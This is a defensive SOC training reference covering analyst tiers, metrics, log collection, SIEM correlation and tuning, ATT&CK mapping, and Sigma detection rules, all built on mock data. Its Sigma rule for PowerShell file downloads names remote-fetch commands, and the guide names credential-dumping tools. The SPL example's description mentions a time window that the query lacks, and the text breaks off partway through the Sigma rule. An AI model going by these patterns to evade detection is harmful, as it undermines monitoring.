# SOC Monitoring & Threat Hunting — Complete Reference

> **Document:** SOC_MONITORING_THREAT_HUNTING_MASTER.md
> **Version:** 1.0
> **Classification:** Internal Reference / Training Material
> **Scope:** Security Operations Center (SOC) operations, log management, SIEM, detection engineering, threat hunting, SOAR, network & endpoint monitoring, cloud security, triage, metrics, playbooks, and threat intelligence.
>
> **IMPORTANT — FICTIONAL DATA NOTICE:** All company names, users, IP addresses, hostnames, alert IDs, metrics, and event data in this document are **fictional**. Any resemblance to real organizations or individuals is coincidental. Everything is synthetic mock data built purely for education and training.

---

## Table of Contents

1. [Security Operations Center (SOC)](#1-security-operations-center-soc)
2. [Log Management](#2-log-management)
3. [SIEM (Security Information and Event Management)](#3-siem)
4. [Detection Engineering](#4-detection-engineering)
5. [Use Case: Detecting Common Attacks](#5-use-case-detecting-common-attacks)
6. [Threat Hunting](#6-threat-hunting)
7. [SOAR (Security Orchestration, Automation, and Response)](#7-soar)
8. [Network Security Monitoring (NSM)](#8-network-security-monitoring-nsm)
9. [Endpoint Telemetry](#9-endpoint-telemetry)
10. [Cloud Security Monitoring](#10-cloud-security-monitoring)
11. [Alert Triage & Escalation](#11-alert-triage--escalation)
12. [Metrics & Reporting](#12-metrics--reporting)
13. [SOC Playbooks & Runbooks](#13-soc-playbooks--runbooks)
14. [Mock SOC Day-in-the-Life](#14-mock-soc-day-in-the-life)
15. [Threat Intelligence in the SOC](#15-threat-intelligence-in-the-soc)

---

# 1. Security Operations Center (SOC)

## 1.1 What is a SOC?

A **Security Operations Center (SOC)** is a centralized function — a combination of people, processes, and technology — responsible for continuously monitoring an organization's security posture, detecting and analyzing security events, and responding to incidents. The SOC is the "nerve center" of an organization's defensive security program.

A SOC is **not just a room with screens**. It is an operating model that produces 24/7/365 monitoring coverage, coordinated incident response, and measurable security outcomes.

### Core value a SOC delivers

| Value | Description |
|---|---|
| **Continuous visibility** | Constant monitoring of endpoints, network, cloud, identities, and applications |
| **Faster detection** | Reduction in time from compromise to detection (dwell time) |
| **Coordinated response** | Consistent, documented, repeatable handling of incidents |
| **Compliance** | Evidence of monitoring, retention, and response activities for auditors |
| **Context** | Correlation of isolated events into a coherent incident narrative |
| **Continuous improvement** | Metrics, tuning, and hunting that improve detection quality over time |

## 1.2 SOC Functions

The core SOC functions map to a lifecycle often summarized as **Monitor → Detect → Respond → Report** (some models add *Prevent* and *Recover*).

| Function | Description | Example activities |
|---|---|---|
| **Monitor** | Continuous collection and review of telemetry from all sources | Reviewing SIEM dashboards, watching network traffic baselines, checking cloud audit logs, monitoring ticket queues |
| **Detect** | Identify malicious or anomalous activity via rules, analytics, and hunting | SIEM correlation alerts, EDR detections, IDS/IPS signatures, anomaly detection, threat-hunting queries |
| **Respond** | Investigate alerts, contain the threat, and remediate | Isolating a host, disabling a compromised account, blocking an IP in the firewall, collecting evidence, notifying the incident response team |
| **Report** | Document findings and communicate status to stakeholders | Writing incident reports, producing shift handover notes, generating monthly metrics, briefing management |

### The SOC workflow loop

```
     Raw Logs ──► Collection ──► Normalization ──► Correlation ──► Alert ──► Triage ──► Investigation ──► Response
         ▲                                                                                                │
         │                                                                                                ▼
     Feedback & Tuning ◄──── Post-Incident Review ◄───────────── Documentation & Metrics ◄───────── Closure
```

## 1.3 SOC Tiers

Most mature SOCs operate a **3-tier model** that divides labor by skill level and responsibility. This gives a clear career path and ensures that complex analysis is handled by the most experienced staff.

| Tier | Name | Primary role | Typical tasks | Skill level | Time on tasks |
|---|---|---|---|---|---|
| **Tier 1** | Triage / Alert Analyst | First line of defense; monitors dashboards and triages alerts | Monitor alert queues, validate alert legitimacy, open incidents, perform basic enrichment, escalate confirmed threats, create tickets | Foundation (Security+, entry-level) | Alert triage ~70%, monitoring ~20%, documentation ~10% |
| **Tier 2** | Incident Responder / Analyst | Deep investigation and containment of confirmed incidents | Correlate across sources, perform host/network forensics, contain and eradicate threats, coordinate with IT, write incident reports | Intermediate (3–5 yrs, GIAC certs) | Investigation ~60%, response ~25%, reporting ~15% |
| **Tier 3** | Threat Hunter / SME | Proactive hunting, advanced analysis, tooling & rule development | Hypothesis-driven hunting, malware reverse engineering, detection engineering, SIEM tuning, threat-intel research | Advanced (5+ yrs, senior/SME) | Hunting ~40%, detection engineering ~30%, incident support ~30% |

> **Note on terminology:** Some organizations split Tier 3 into "Tier 3 Incident Responder" and "Threat Hunter" as separate roles, or add a "SOC Manager" layer above all tiers. The three-tier model here is the industry norm.

### Tier 1 — Triage Analyst (job duties)

- Monitor SIEM dashboards, email gateways, EDR consoles, and threat-intel feeds.
- Verify that alerts are real (e.g., "is this really a failed login burst, or just a misconfigured app?").
- Open and assign tickets in the case-management system.
- Perform first-pass enrichment: look up IP reputation, user role, asset criticality.
- Contain low-complexity, high-confidence threats (e.g., block a confirmed phishing URL).
- Escalate confirmed incidents to Tier 2 with a completed triage summary.
- Update knowledge base with tuning suggestions (reduce false positives).

### Tier 2 — Investigation Analyst (job duties)

- Lead the investigation of escalated incidents end-to-end.
- Pull logs from SIEM, endpoints, proxies, DNS, and cloud providers to reconstruct the kill chain.
- Perform memory/disk forensics (with Tier 3 support) and identify malware or attacker TTPs.
- Execute containment (host isolation, account disable, firewall blocks) and eradication.
- Write accurate, evidence-backed incident reports.
- Recommend detection and process improvements to Tier 3.

### Tier 3 — Threat Hunter / SME (job duties)

- Design and run hypothesis-driven hunting engagements using MITRE ATT&CK.
- Develop and tune detection rules (Sigma, KQL, SPL, Suricata).
- Build attacker emulation to validate detections (red/purple team collaboration).
- Support Tier 2 on advanced incidents (reverse engineering, memory analysis).
- Maintain the detection backlog and prioritization roadmap.
- Analyze threat-intelligence feeds to translate intel into actionable detections.

## 1.4 SOC Metrics

The SOC measures itself on detection and response speed, plus the quality of its detections.

| Metric | Full name | Definition | Good target (mock) |
|---|---|---|---|
| **MTTD** | Mean Time to Detect | Average time from the start of a security incident to when it is detected | < 2 hours (median) |
| **MTTR** | Mean Time to Respond | Average time from detection to containment/remediation | < 4 hours |
| **MTTA** | Mean Time to Acknowledge | Average time from alert creation to an analyst picking it up | < 15 minutes |
| **Alert volume** | — | Number of alerts generated per day/week | Tuned to < 500/day |
| **FPR** | False Positive Rate | Percentage of alerts that are not true security events | < 15% |
| **FNR** | False Negative Rate | Percentage of real attacks that produce no alert (harder to measure; measured via purple team) | — |
| **Dwell time** | — | Time an attacker was present in the environment before detection | < 7 days |
| **Coverage** | Detection coverage | % of MITRE ATT&CK techniques the SOC can detect | > 60% of priority techniques |

### Mock SOC metrics dashboard

```
+-----------------------------------------------------------------------+
|                  SOC OPERATIONS DASHBOARD — Northwind SecOps · Wk 32   |
+-----------------------------------------------------------------------+
|  Alerts this week            612 total                                 |
|    - Confirmed true positive  142  (23.2%)                             |
|    - False positive            96  (15.7%)                             |
|    - Benign/expected          374  (61.1%)                             |
|                                                                        |
|  MTTA  8 min    MTTD  1h 47m    MTTR  3h 12m                          |
|                                                                        |
|  Open incidents: 17   SLA breached: 2   Escalations to Tier 2: 11      |
|  Queue depth: Tier1 42 · Tier2 9 · Tier3 3                             |
|  Top alert sources: Endpoint 38% · Firewall 21% · Cloud 17% · Email 14%|
+-----------------------------------------------------------------------+
```

### Reading the dashboard

- **612 alerts / week ≈ 87/day** — reasonable volume for a mid-size org of ~5,000 endpoints once tuned.
- **23.2% true positive** — decent; many SOCs run 5–20% TP. The "benign/expected" bucket (61%) is large and is a tuning target.
- **MTTA 8 min** — analysts are acknowledging alerts within their 15-minute SLA.
- **MTTD 1h 47m** — faster than the 2-hour target; good.
- **MTTR 3h 12m** — under the 4-hour target, but 2 SLA breaches this week are worth a retrospective.

## 1.5 SOC Staffing Models

There are three common ways to staff a SOC. Each trades cost against control and coverage.

| Model | Description | Pros | Cons |
|---|---|---|---|
| **In-house SOC** | Organization hires and trains its own analysts | Full control, deep business context, culture alignment | Expensive, hard to hire/retain talent, slow to scale |
| **MSSP (outsourced)** | Third-party provider monitors on your behalf | Predictable cost, 24/7 coverage, access to broad expertise | Less context, potential alert fatigue for provider, communication friction |
| **Hybrid / Co-managed** | In-house Tier 2/3 + outsourced Tier 1, or vice versa | Balance of cost and control; MSSP handles after-hours triage | Needs strong SLAs and escalation agreements between teams |

### Staffing formula (rough guide)

A commonly used rule of thumb: **1 analyst per ~300–500 alerts/day**, or roughly **1 Tier-1 analyst per 2,500–5,000 endpoints**, with a Tier 2:1 ratio of ~1 Tier 2 per 4–6 Tier 1, and 1 Tier 3 per ~20 analysts.

## 1.6 24/7 Operations

A SOC must monitor around the clock because attackers do not keep office hours. Common shift structures:

| Model | Description |
|---|---|
| **3×8-hour shifts** | Days (07:00–15:00), Swings (15:00–23:00), Mids (23:00–07:00). Handoffs at shift change. |
| **4-on / 4-off** | Four 12-hour days followed by four days off. Good for continuity, tough on fatigue. |
| **Follow-the-sun** | In-house SOC in region A (e.g., US), MSSP or second team in region B (e.g., EU/APAC). Work is handed off across time zones. |
| **Day team + after-hours alerting** | Smaller orgs run a day SOC and page an on-call analyst after hours for critical alerts only. |

### Shift handover (mock)

```
HANDOVER — 2026-08-05 15:00 → 15:00-23:00 shift (Swing)
Prepared by: A. Chen (Tier 1)     Received by: M. Osei (Tier 1)

OPEN INCIDENTS
- INC-2441 (P2, brute-force on WEB-SRV-12): awaiting Tier 2 review; IoC list updated.
- INC-2440 (P3, phishing report): user clicked link, no creds entered; user re-trained.

HOT QUEUE (review within 30 min)
- ALERT-88912: 47 failed RDP logins from 10.66.3.0/24 subnet → suspicious, VLAN is unassigned.
- ALERT-88914: First-time scheduled task on DC-02 at 03:11.

FEEDS DOWN
- Threat intel feed (VirusTotal) degraded since 14:40; fallback to AlienVault OTX working.

TUNING NOTES
- Firewall "port scan" rule producing 30+ FPs/day from NMAP scans run by NetSec every Mon.
  Recommend suppression window Mon 06:00-08:00.
```

---

# 2. Log Management

## 2.1 What to Log

You can only detect what you collect. Log management is the foundation of every downstream capability — SIEM correlation, threat hunting, forensics, and compliance all depend on the logs you retain.

### Minimum logging guidance (the "you should log" list)

| Category | What to capture | Why it matters |
|---|---|---|
| **Authentication** | Successful + failed logins, logon types, service account usage | Detects brute force, credential stuffing, and anomalous access |
| **Privilege changes** | Group membership changes, admin account creation, UAC changes | Detects privilege escalation and persistence |
| **Endpoint process activity** | Process creation, command lines, file creation/deletion | Detects malware execution, LOLBins, PowerShell abuse |
| **Network connections** | Flow metadata (who connected to whom, when, how much data) | Detects C2, beaconing, data exfiltration |
| **DNS** | Query name, source IP, response | Detects DGA, tunneling, suspicious domains |
| **File integrity** | Hashes of critical files before/after change | Detects tampering, ransomware encryption, persistence |
| **Email** | Message metadata, attachments, links | Detects phishing campaigns |
| **Cloud audit** | CloudTrail/activity logs, IAM actions, API calls | Detects IAM abuse, misconfiguration, account takeover |
| **Application** | Web server, database, business app logs | Detects web attacks (SQLi, XSS), app-layer abuse |

## 2.2 Log Sources

### Windows

| Source | Details | Key events |
|---|---|---|
| **Security log** | Auditing of authentication, privileges, object access | 4624 (logon), 4625 (failed logon), 4672 (admin logon), 4720 (user created), 4732 (member added) |
| **System log** | Services, drivers, hardware | 7045 (service installed), 7040 (service start type changed) |
| **Application log** | Application crashes/errors | 1000+ (app errors) |
| **PowerShell (4104)** | Script block logging | Full PowerShell script content |
| **Sysmon (Event 1–26)** | Deep endpoint telemetry | 1 (process create), 3 (network connect), 10 (LSASS access), 11 (file create), 13 (registry) |
| **Windows Defender** | Malware detections | 1116, 1117, 5007 (policy change) |

### Linux

| Source | Details |
|---|---|
| **/var/log/auth.log** (Debian) or **/var/log/secure** (RHEL) | Authentication and sudo events |
| **/var/log/syslog** | General system messages |
| **/var/log/messages** | Kernel + system messages |
| **journald** | Binary journal; export via `journalctl` to rsyslog |
| **auditd** | Kernel-level auditing (`ausearch`, `aureport`) |
| **/var/log/cron** | Scheduled job execution |

### Network

| Source | Details |
|---|---|
| **Firewall logs** | Allowed/blocked flows, NAT translations |
| **Proxy logs** | HTTP/HTTPS requests, URLs, categories, users |
| **DNS logs** | Query and response data |
| **IDS/IPS** | Signature matches (Suricata/Snort) |
| **NetFlow/sFlow** | Flow metadata summaries |
| **Full packet capture** | Raw packets (PCAP) for deep forensics |

### Cloud

| Source | Details |
|---|---|
| **AWS CloudTrail** | All API calls (management + data events) |
| **AWS VPC Flow Logs** | IP traffic metadata in the VPC |
| **Azure Activity Log / Sentinel** | Azure control-plane + security events |
| **GCP Cloud Audit Logs** | GCP API activity |
| **CSPM / posture scans** | Misconfiguration findings (e.g., S3 bucket public) |

## 2.3 Log Formats

Logs arrive in many shapes. SIEMs normalize them into a common schema.

| Format | Example | Notes |
|---|---|---|
| **Syslog (RFC 5424)** | `<34>1 2026-08-05T12:00:00Z host app - - "message"` | Standard for network devices & Linux |
| **Windows Event Log (EVTX)** | XML structures; collected via WinRM/WEF or agents | Rich, structured |
| **CEF** | `CEF:0|Vendor|Product|Version|Signature|Name|Severity|ext=...` | Common Event Format (ArcSight era, still used) |
| **LEEF** | `LEEF:1.0|Vendor|Product|Version|EventID|...` | Log Event Extended Format (QRadar) |
| **JSON** | `{"timestamp":"...","src_ip":"...","event":"login"}` | Modern default; used by most SaaS/cloud |
| **CSV/TSV** | `ts,src,dst,bytes` | Simple, common for exports |
| **Key=value** | `src=10.0.0.5 dst=8.8.8.8 sport=12345` | Pairs, common in proxy/firewall logs |
| **Free text** | `Mar 1 12:00:00 host sshd[1234]: Failed password for root` | Hardest to parse; needs pattern extraction |

### Normalization example

Raw Windows 4625 (truncated): `An account failed to log on... LogonType: 3...`

Normalized into SIEM fields:

```json
{
  "event_id": 4625,
  "category": "authentication",
  "outcome": "failure",
  "src_user": "svc-sqlsa",
  "src_host": "10.10.5.22",
  "dst_host": "DB-03",
  "logon_type": 3,
  "time": "2026-08-05T12:00:00Z"
}
```

## 2.4 Log Retention

Retention is a balance between **forensic needs**, **compliance mandates**, and **cost**.

| Driver | Typical retention |
|---|---|
| **Hot storage (fast query)** | 7–30 days |
| **Warm storage (searchable)** | 90–365 days |
| **Cold/archive (rare access)** | 1–7 years |
| **PCI DSS (Req 10.7)** | Minimum 1 year, available for 90 days for review |
| **HIPAA** | 6 years |
| **SOC 2 / ISO 27001** | Determined by policy; commonly 1 year |

### Mock retention policy

| Log type | Hot | Warm | Cold | Rationale |
|---|---|---|---|---|
| Endpoint/Sysmon | 30 d | 180 d | 2 yr | Forensics + hunting |
| Authentication | 30 d | 180 d | 2 yr | Account compromise review |
| Firewall/NetFlow | 14 d | 90 d | 1 yr | Network review |
| Email | 30 d | 90 d | 1 yr | Phishing investigations |
| Cloud audit | 30 d | 180 d | 3 yr | Compliance + cloud incidents |
| PCAP | 5 d | 0 | 0 | Too large to keep long |

## 2.5 Log Integrity

If an attacker can edit or delete logs, your detection and forensics are worthless. Log integrity measures:

| Measure | Description |
|---|---|
| **Write-once storage** | Use append-only / WORM (Write Once, Read Many) storage |
| **Centralized collection** | Send logs immediately to a central server so local tampering doesn't matter |
| **Hashing / chain-of-custody** | Store a hash of each batch so tampering is detectable |
| **Separate admin accounts** | Log admins cannot modify logs (separation of duties) |
| **Forward-only agents** | Agents that cannot read back from the collector (e.g., syslog over TLS, one-way replication) |
| **Time synchronization** | NTP everywhere so timestamps are trustworthy and correlated |

## 2.6 Central Logging Architecture

```
+------------+   +------------+   +------------+
|  Windows   |   |   Linux    |   |  Network   |
|   hosts    |   |   hosts    |   |  devices   |
+-----+------+   +-----+------+   +-----+------+
      | WEF/agent     | rsyslog      | syslog
      v               v              v
+-----------------------------------------------------+
|        Log Collectors / Forwarders                   |
|   (edge tier, e.g., fluentbit, Winlogbeat,           |
|    rsyslog relays, logstash — TLS-encrypted)         |
+--------------------------+--------------------------+
                           | encrypted, compressed
                           v
+-----------------------------------------------------+
|         Central Index / SIEM                        |
|   (Elasticsearch cluster, Splunk indexers,          |
|    Sentinel LAW, cloud SIEM; hot/warm/cold + archive)|
+--------------------------+--------------------------+
                           |
             +-------------+------------+
             |                          |
             v                          v
   Search & dashboards          Archive (S3 / cold
   Correlation rules / alerts    storage, hashed)
```

### Architecture principles

- **Collect at the edge, ship centrally.** Keep agents light; do the heavy parsing centrally.
- **Encrypt in transit.** TLS for syslog, TLS for agent shipping.
- **Resilience.** Collectors must buffer locally if the central index is down (dead-letter queues).
- **Load balancing.** Multiple indexers/collectors so one box is never a single point of failure.
- **Tiered storage.** Keep hot data fast and expensive, cold data cheap and slow.

## 2.7 Windows Event Log Forwarding (WEF)

Windows Event Forwarding is Microsoft's native way to centralize Windows logs without third-party agents.

```
Domain Clients --(WinRM 5985/5986)--> Collector (WEC server) --> SIEM forwarder --> SIEM
```

### Configuring the collector (mock steps)

1. Create a subscription on the WEC server:
```powershell
wecutil ec "SubscriptionName" /f
wecutil ss "SubscriptionName" /cm:"Push" /e:true
```
2. Define the event query (e.g., collect all Security + Sysmon + PowerShell):
```xml
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">*[System[(EventID=4624 or EventID=4625 or EventID=4720 or EventID=4732)]]</Select>
  </Query>
  <Query Id="1" Path="Microsoft-Windows-Sysmon/Operational">
    <Select Path="Microsoft-Windows-Sysmon/Operational">*</Select>
  </Query>
</QueryList>
```
3. Point the WinRM collector at the SIEM forwarder for shipping.

### Typical WEF subscription types

| Type | Description |
|---|---|
| **Push (Source Initiated)** | Clients push to the collector; good for the whole domain |
| **Pull (Collector Initiated)** | Collector pulls from servers; good for domain controllers |

## 2.8 Linux rsyslog Configuration (mock)

Centralize Linux logs with rsyslog. This config sends auth + syslog to a central server over TLS (port 6514).

`/etc/rsyslog.conf` (client side, snippet):

```text
# Load modules
module(load="imuxsock")
module(load="imklog")
module(load="imjournal" StateFile="/var/lib/rsyslog/imjournal.state")

# Template for remote (RFC 5424 + hostname)
$template RemoteFormat,"%hostname% %syslogtag% %msg%\n"

# TLS encryption
module(load="imtcp")
module(load="gtls")
global(DefaultNetstreamDriverCAFile="/etc/rsyslog.d/ca.pem")
$ActionSendStreamDriver gtls
$ActionSendStreamDriverMode 1

# Forward everything to the central collector
*.* @10.20.30.40:6514;RemoteFormat

# Forward auth logs to a dedicated priority channel
auth,authpriv.* @10.20.30.40:6514;RemoteFormat
```

Central server `/etc/rsyslog.conf` (receiver, snippet):

```text
module(load="imtcp")
module(load="gtls")
global(DefaultNetstreamDriverCAFile="/etc/rsyslog.d/ca.pem")

input(type="imtcp" port="6514" address="0.0.0.0"
      ruleset="remoteTLS" StreamDriver.Name="gtls"
      StreamDriver.Mode="1" StreamDriver.AuthMode="x509/name")

$template DynFile,"/var/log/remote/%fromhost-ip%/%programname%.log"
ruleset(name="remoteTLS") {
    if ( $fromhost-ip != "0.0.0.0" ) then {
        action(type="omfile" dynaFile="DynFile")
    }
}
```

## 2.9 Log Sizing and Cost

Log volume drives SIEM licensing cost (per GB/day) and storage cost. Budget realistically.

### Mock sizing worksheet

| Source | Events/day/asset | Bytes/event | Daily GB (5,000 endpoints) |
|---|---|---|---|
| Windows Security (curated) | 400 | 500 B | 1.0 GB |
| Sysmon (full) | 2,000 | 800 B | 8.0 GB |
| Firewall | 1,500/device | 300 B | 1.0 GB (300 devices) |
| DNS | 20,000/server | 200 B | 1.2 GB (8 servers) |
| Proxy | 5,000/user | 400 B | 10.0 GB |
| Cloud audit | varies | 1 KB | 2.0 GB |
| **Total daily ingest** | | | **~23 GB/day** |

### Cost control techniques

| Technique | Description |
|---|---|
| **Log profiling** | Measure actual bytes/day per source before signing SIEM contracts |
| **Curated filtering** | Drop noise at the source (e.g., only keep Security ID 4624/4625, not every audit) |
| **Storage tiers** | Hot = expensive fast disk; archive = cheap object storage |
| **Compression** | Compress cold logs; often 10:1 |
| **Sampling** | Only for high-volume low-value data (e.g., NetFlow) |
| **Data minimization** | Do not send PII you don't need (reduces breach scope too) |

---

# 3. SIEM (Security Information and Event Management)

## 3.1 What a SIEM Does

A **SIEM (Security Information and Event Management)** platform centralizes logs and turns them into detection and insight. The "SIEM core" has four stages:

| Stage | Description | Analogy |
|---|---|---|
| **Collect** | Ingest logs from every source (endpoints, network, cloud, apps) | The SIEM is the filing cabinet |
| **Normalize** | Parse varied formats into a common schema with consistent field names | Translations to one language |
| **Correlate** | Join related events across sources and time windows to detect multi-step attacks | The detective connecting clues |
| **Alert** | Fire an alert when correlation conditions match a detection rule | The alarm |

### What a SIEM is NOT

- **Not a replacement for visibility** — garbage in, garbage out. If you don't log it, the SIEM can't see it.
- **Not autonomous response** — most SIEMs alert; SOAR (or an EDR) does the automated action.
- **Not a guarantee of detection** — a SIEM only fires the rules you built and tuned.

## 3.2 SIEM vs SOAR vs EDR

| Capability | SIEM | SOAR | EDR |
|---|---|---|---|
| **What it does** | Collects & correlates logs, produces alerts | Orchestrates + automates response workflows | Monitors and responds on endpoints |
| **Data source** | Logs from everywhere | Works on alerts/incidents | Endpoint telemetry only |
| **Primary output** | Alerts & dashboards | Automated playbooks & tickets | Detection + containment on host |
| **Example tools** | Splunk Enterprise Security, Microsoft Sentinel, Elastic SIEM, QRadar, ArcSight | Splunk SOAR (Phantom), Palo Alto XSOAR, Swimlane, Tines | CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Carbon Black |
| **Strength** | Breadth of visibility | Speed & consistency of response | Depth of endpoint control |

**How they work together:** EDR sees a malicious process → sends telemetry to the SIEM → SIEM correlates it with the user's 4625 login bursts → fires an alert → SOAR playbook automatically isolates the host and opens a ticket → Tier 1 confirms and documents.

## 3.3 Popular SIEMs

| SIEM | Strengths | Typical deployment |
|---|---|---|
| **Splunk Enterprise Security** | Powerful SPL querying, huge ecosystem, mature dashboards | Large enterprises; high licensing cost |
| **Microsoft Sentinel** | Cloud-native, KQL, tight Azure/M365 integration, low entry cost | Microsoft shops; cloud-first |
| **Elastic SIEM (Elastic Stack)** | Open source, flexible, cheap at scale, good detection rules | Cost-conscious orgs; SOC with engineering skill |
| **IBM QRadar** | Strong correlation engine, legacy maturity | Traditional enterprise |
| **Google Chronicle** | Massive-scale log storage, fast search, label-based detection | Very large/cloud orgs |

## 3.4 SIEM Use Cases

| Use case | Example |
|---|---|
| **Compliance monitoring** | "Show all admin logons to PCI systems in the last 90 days" |
| **Real-time alerting** | "Alert if 10+ failed logons to a single account in 5 minutes" |
| **Forensics** | "Reconstruct the attacker's path through the environment using DNS, proxy, and endpoint logs" |
| **Threat hunting** | "Find all hosts that queried domains matching a DGA regex in the last 30 days" |
| **Reporting** | Weekly/monthly SOC metrics and board-ready summaries |

## 3.5 SIEM Implementation

### High-level implementation plan

| Phase | Activities | Duration (mock) |
|---|---|---|
| **1. Discover** | Inventory assets, log sources, criticality tiers, compliance drivers | 2–4 weeks |
| **2. Design** | Architecture (collectors, indexers), schema, retention tiers, ingest budget | 2–3 weeks |
| **3. Build** | Stand up platform, configure forwarding, onboard top sources | 4–8 weeks |
| **4. Detect** | Deploy core detection rules (auth, endpoint, network) | 4–6 weeks |
| **5. Tune** | Review alert volumes, add suppressions, tune thresholds | Ongoing |
| **6. Operate** | Staff the queue, build runbooks, measure KPIs, hunt | Ongoing |

### Golden rules for implementation

1. **Start with the crown jewels** — log the critical assets first (DCs, domain admins, payment systems).
2. **Plan ingest budget** before you sign the contract (see §2.9).
3. **Tune from day one** — an untuned SIEM drowns analysts in noise and destroys trust in alerts.
4. **Design for data quality** — field mapping and normalization are 80% of the value.
5. **Involve the analysts** who will use it; don't build in a vacuum.

## 3.6 Correlation Rules

A correlation rule is a query that looks for a *pattern across time and/or sources*. Rules live in the SIEM and fire alerts.

### Mock Splunk (SPL) correlation rule — brute force

```splunk
index=wineventlog EventCode=4625
| stats count as failed by src_ip, Account_Name
| where failed >= 10
| search failed
| join type=outer src_ip [ search index=wineventlog EventCode=4624 earliest=-7d
      | stats count as success by src_ip ]
| eval suspicious = if(success < 2, "yes", "no")
| table src_ip, Account_Name, failed, success, suspicious
```

**What it does:** Counts failed logons (4625) per source IP in the last 15 minutes, flags any IP with ≥10 failures, and joins with the last 7 days of successful logons to decide if the source has *ever* logged in successfully. Low/no successful logins from that IP → suspicious brute-force source.

### Mock Elasticsearch / Lucene rule (ElastAlert or detection rule)

```yaml
# brute_force_rdp.yml
name: RDP Brute Force
index: windows-*
realert:
  minutes: 0
filter:
- query_string:
    query: "event_id:4625 AND winlog.channel:Security AND logon_type:10"
aggregation:
  schema: terms
  field: src_ip
  size: 100
  timeout: 120s
aggregation_key: src_ip
run_every:
  minutes: 15
query_key: src_ip
type: frequency
num_events: 10
```

**What it does:** Every 15 minutes, look back and find any `src_ip` that produced ≥10 failed interactive (type 10) logons. Alert on those source IPs.

### Correlation categories

| Category | Description | Example |
|---|---|---|
| **Threshold** | Alert when count exceeds N in a window | ≥10 failed logins |
| **Sequence** | Alert when events occur in a specific order | Malware download → then execution → then C2 |
| **Single event** | Alert on one high-signal event | LSASS memory access (Sysmon 10) |
| **Baselining/anomaly** | Alert when behavior deviates from learned baseline | User's first-ever logon from a new country |
| **Missing event** | Alert when an expected event does NOT happen | Backup job did not complete, or agent heartbeat stopped |

## 3.7 Alert Tuning (Reducing False Positives)

False positives are the #1 cause of alert fatigue and analyst burnout. Tuning is a continuous discipline.

| Technique | Description | Example |
|---|---|---|
| **Threshold adjustment** | Raise/lower counts or time windows | 10 failed logins → 25 failed logins for an app server that always has typos |
| **Field-based filtering** | Exclude known-good users/hosts/processes | Ignore failed logins from the service account `svc-monitoring` |
| **Whitelist / allowlist** | Explicit known-bad vs known-good lists | Allowlist admin console hosts for the "new admin account" rule |
| **Time-based suppression** | Don't alert during known maintenance windows | Suppress port-scan rule Mon 06:00–08:00 (NMAP scans) |
| **Alert deduplication** | Group repeated identical events | 50 identical alerts from one host → one alert |
| **Feedback loop** | Analysts mark false positives in the case tool; tuning reviews are monthly | FPR trend reviewed weekly |

### Mock tuning report

```text
DETECTION TUNING REVIEW — July 2026
Rule: "Excessive Failed Logons" (ID: DET-1010)

Baseline stats (last 30 days):
  Alerts fired:            1,242
  Confirmed TRUE:             87   (7.0%)
  False positive:          1,155   (93.0%)

Top false-positive sources:
  1. SVC-MONITORING service account    ~600 events (typos in scheduled jobs)
  2. Web app health checks (WAF)       ~300 events
  3. Legacy VPN client (v3.1)          ~200 events
  4. Misc                                 ~55 events

Actions taken (2026-08-01):
  - Added SVC-MONITORING + WAF IPs to allowlist      -> est. -72% FP
  - Raised threshold from 10 -> 20 in 5-min window   -> est. -20% FP
  - Added alert dedupe (same src, 1 alert/10 min)    -> est. -80% queue volume

Expected result: FPR 93% -> ~35%, queue volume down ~85%.
```

---

# 4. Detection Engineering

## 4.1 The Detection Lifecycle

Detection engineering is the discipline of turning *threat knowledge* into *working detections* that fire reliably on malicious activity and stay quiet on normal activity.

```
  Threat Intel / ATT&CK Technique
        |
        v
   Hypothesis ("how would this look in my logs?")
        |
        v
   Write Detection (Sigma/KQL/SPL/rule)
        |
        v
   Validate (test with real/simulated attacker TTPs)
        |
        v
   Deploy (SIEM/EDR/IDS)
        |
        v
   Tune (reduce FPs, tune thresholds)
        |
        v
   Maintain (review when environment changes, retire stale rules)
```

### Lifecycle stages in detail

| Stage | Key questions |
|---|---|
| **Hypothesis** | What TTP is this for? What log sources exist that would show it? |
| **Write** | Which fields identify the behavior? What is the noise? |
| **Validate** | Does it fire on the attack? Does it fire on normal ops? (Use a test env, atomic red team, or captured attack data) |
| **Deploy** | Where does it run (SIEM, EDR, IDS)? What severity/priority? |
| **Tune** | Measure FPR over time; adjust thresholds, allowlists, dedupe |
| **Maintain** | Re-review quarterly; decommission rules that never fire (or that only fire noise) |

## 4.2 MITRE ATT&CK as the Detection Language

[MITRE ATT&CK](https://attack.mitre.org/) is the de facto standard knowledge base of adversary tactics and techniques. It gives detections a *common language* so you can reason about coverage.

- **Tactic** = the *goal* (e.g., Initial Access, Persistence, Lateral Movement, Exfiltration).
- **Technique** = the *how* (e.g., T1078 Valid Accounts, T1021.002 SMB/Admin Shares).
- **Sub-technique** = a more precise variant (e.g., T1059.001 PowerShell).
- **Procedure** = the specific tooling an attacker used (e.g., "Rubeus with `/ptt`").

### Example mapping

| ATT&CK ID | Technique | Detection example |
|---|---|---|
| **T1078** | Valid Accounts | Alert on new account + immediate admin logon |
| **T1110** | Brute Force | Threshold rule on 4625 events |
| **T1003.001** | LSASS credential dumping | Sysmon Event 10 / Mimikatz signature |
| **T1547.001** | Registry Run Keys | Sysmon 13 on `...\Run` keys |
| **T1021.001** | Remote Desktop | Alert on RDP logons from non-admin workstations |
| **T1571** | Non-standard port C2 | Beacon detection on uncommon ports |

### Coverage matrix (mock)

| Tactic | Techniques | Detected | Partial | Missing | Coverage |
|---|---|---|---|---|---|
| Initial Access | 9 | 5 | 2 | 2 | 78% |
| Execution | 14 | 9 | 3 | 2 | 75% |
| Persistence | 19 | 11 | 5 | 3 | 71% |
| Lateral Movement | 9 | 6 | 2 | 1 | 78% |
| Exfiltration | 9 | 5 | 2 | 2 | 67% |
| **Total** | **60** | **36** | **14** | **10** | **72%** |

## 4.3 Sigma Rules

**Sigma** is an open, generic signature format for log events. A Sigma rule describes *what to look for in logs* independent of the SIEM. Tools convert Sigma → Splunk SPL, KQL, Elasticsearch, etc. Sigma is like the "YARA of log detection."

### Sigma structure

```yaml
title: Suspicious PowerShell Download
id: 8d6f8d6e-0000-4a1b-9a2c-1f2e3d4c5b6a
status: test
description: Detects PowerShell downloading a file from the internet
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1105/
author: SOC Engineering
date: 2026/08/05
logsource:
  product: windows
  category: ps_script
  definition: PowerShell ScriptBlock Logging enabled (Event 4104)
detection:
  selection:
    ScriptBlockText|contains|all:
      - "Invoke-WebRequest"
      - "-OutFile"
  selection2:
